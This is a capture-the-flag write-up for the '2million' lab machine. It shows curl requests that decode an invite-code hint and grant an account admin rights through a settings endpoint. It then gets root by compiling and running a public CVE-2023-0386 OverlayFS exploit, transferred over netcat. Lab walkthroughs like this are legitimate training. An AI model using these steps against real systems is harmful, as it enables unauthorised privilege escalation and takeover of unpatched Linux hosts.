Generate a Invite Code
#

Apparently we need an invitation code to access.

We look at the other path and see that it is a javascript script:

find a function that creates an invite code for us

We see that it makes a POST request to an api in /api/v1/invite/how/to/generate.

I am trying to make a request to the API. (/api/v1) but it tells me that it does not exist so I try to generate a code.

> curl -sXPOST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}

Returns a string in ROT13

> echo 'Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate

We create our invitation code.

> curl -sXPOST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"VE0yRlgtMlkxOVMtR0JPQzEtNTc5TUs=","format":"encoded"}}

Change my user settings
#

We change our user settings:

curl -sXPUT http://2million.htb/api/v1/admin/settings/update -b 'PHPSESSID=ugpbnr10pk9rjvclhpskh2rsgh' -H 'Content-Type: application/json' -d '{"email": "mhil4ne@gmail.com", "is_admin": 1}'

Now that we are admin user, we can inject commands through the username parameter.

#

3. Privilege Escalation
#

CVE-2023-0386
#

Here CVE-2023-0386

We take it to our attacking machine:

svn checkout https://github.com/DataDog/security-labs-pocs/trunk/proof-of-concept-exploits/overlayfs-cve-2023-0386

We compile the file:

Install libfuse-dev

gcc poc.c -o poc -D_FILE_OFFSET_BITS=64 -static -lfuse -ldl -lpthread

You pass the file to the victim machine:

# From the victim machine
nc -nlvp 1222 > poc

# From the attacking machine
nc 10.10.11.221 1234 < poc

Now we give it execution permissions:

chmod +x poc

We execute it

./poc

You are now Root.

root@2million:~# whoami
root
